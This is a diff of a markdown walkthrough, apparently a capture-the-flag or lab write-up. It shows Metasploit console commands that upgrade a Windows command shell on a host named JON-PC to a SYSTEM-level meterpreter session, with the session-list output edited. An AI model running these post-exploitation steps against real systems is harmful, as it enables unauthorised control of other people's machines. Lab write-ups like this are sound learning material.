@@ -80,9 +80,9 @@ msf > search shell_to_meterpreter
 msf post(multi/manage/shell_to_meterpreter) > sessions -l
 Active sessions
 ===============
-  Id  Name  Type                     Information                   Connection
-  --  ----  ----                     -----------                   ----------
-  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  $IP -> $IP ($IP)
+  Id  Name  Type                     Information                                               Connection
+  --  ----  ----                     -----------                                               ----------
+  1         shell x64/windows		 Shell Banner: Microsoft Windows [Version 6.1.7601] -----  $IP -> $IP ($IP)
 
 ```
 **Set & Run Meterpreter Shell**
@@ -90,7 +90,15 @@ Active sessions
  msf > Use 0
  msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
  msf post(multi/manage/shell_to_meterpreter) > run
+		{...}
+ msf post(multi/manage/shell_to_meterpreter) > sessions -l
+Id  Name  Type                     Information                                               Connection
+  --  ----  ----                     -----------                                               ----------
+  1         shell x64/windows		 Shell Banner: Microsoft Windows [Version 6.1.7601] -----  $IP -> $IP ($IP)
+  2			meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              $IP -> $IP ($IP)
+
  msf post(multi/manage/shell_to_meterpreter) > sessions 2
+ meterpreter >
 ```
 
 **Migrate Shell**
